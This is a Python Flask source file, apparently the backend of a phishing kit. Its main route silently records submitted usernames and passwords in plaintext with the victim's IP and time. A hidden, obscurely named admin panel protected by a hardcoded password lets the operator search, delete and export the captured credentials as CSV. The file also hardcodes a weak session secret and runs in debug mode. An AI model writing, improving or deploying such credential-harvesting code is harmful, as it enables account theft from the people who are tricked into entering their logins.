from flask import Flask, render_template, request, redirect, url_for, send_file, session
import csv
import os
import uuid
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'very_secret_key_for_session'  # ✅ 세션 사용을 위한 시크릿 키

DATA_FILE = 'log.txt'
ADMIN_PASSWORD = 'tlfldi11'

def load_data():
    if not os.path.exists(DATA_FILE):
        return []
    with open(DATA_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    data = []
    for line in lines:
        parts = line.strip().split('\t')
        if len(parts) == 5:
            data.append({
                'uuid': parts[0],
                'id': parts[1],
                'pw': parts[2],
                'ip': parts[3],
                'time': parts[4]
            })
    return data

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        for row in data:
            f.write('\t'.join([row['uuid'], row['id'], row['pw'], row['ip'], row['time']]) + '\n')

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user_id = request.form.get('id')
        user_pw = request.form.get('pw')
        user_ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        record = f"{uuid.uuid4()}\t{user_id}\t{user_pw}\t{user_ip}\t{timestamp}\n"
        with open(DATA_FILE, 'a', encoding='utf-8') as f:
            f.write(record)
        return '', 204
    return render_template('index.html')

@app.route('/QkdQKdadmin', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        pw = request.form.get('pw')
        if pw == ADMIN_PASSWORD:
            session['admin_logged_in'] = True  # ✅ 세션 설정
            return redirect(url_for('admin_panel'))
        return render_template('admin_login.html', error='비밀번호가 틀렸습니다.')
    return render_template('admin_login.html')

@app.route('/QkdQKdadmin/panel', endpoint='admin_panel')
def admin():
    if not session.get('admin_logged_in'):  # ✅ 보호
        return redirect(url_for('admin_login'))

    records = load_data()
    search_id = request.args.get('search_id', '').strip()
    search_ip = request.args.get('search_ip', '').strip()
    search_date = request.args.get('search_date', '').strip()
    sort = request.args.get('sort', 'time')
    page = int(request.args.get('page', 1))
    per_page = 20

    if search_id:
        records = [r for r in records if search_id in r['id']]
    if search_ip:
        records = [r for r in records if search_ip in r['ip']]
    if search_date:
        records = [r for r in records if r['time'].startswith(search_date)]

    if sort == 'id':
        records.sort(key=lambda x: x['id'])
    else:
        records.sort(key=lambda x: x['time'], reverse=True)

    total = len(records)
    start = (page - 1) * per_page
    end = start + per_page
    page_range = range(1, (total - 1) // per_page + 2)

    return render_template('admin.html', records=records[start:end], page_range=page_range, current_page=page, request=request)

@app.route('/QkdQKdadmin/delete_selected', methods=['POST'])
def delete_selected():
    pw = request.form.get('admin_pw')
    if pw != ADMIN_PASSWORD:
        return '잘못된 접근입니다.', 403
    delete_ids = request.form.getlist('delete_ids')
    records = load_data()
    records = [r for r in records if r['uuid'] not in delete_ids]
    save_data(records)
    return redirect(url_for('admin_panel'))

@app.route('/QkdQKdadmin/delete_all', methods=['POST'])
def delete_all():
    pw = request.form.get('admin_pw')
    if pw != ADMIN_PASSWORD:
        return '잘못된 접근입니다.', 403
    save_data([])
    return redirect(url_for('admin_panel'))

@app.route('/QkdQKdadmin/download')
def download():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    records = load_data()
    filename = 'log_download.csv'
    with open(filename, 'w', newline='', encoding='utf-8-sig') as f:
        writer = csv.writer(f)
        writer.writerow(['아이디', '비밀번호', 'IP', '시간'])
        for r in records:
            writer.writerow([r['id'], r['pw'], r['ip'], r['time']])
    return send_file(filename, as_attachment=True)

@app.route('/QkdQKdadmin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)  # ✅ 로그아웃
    return redirect(url_for('admin_login'))

if __name__ == '__main__':
    app.run(debug=True)
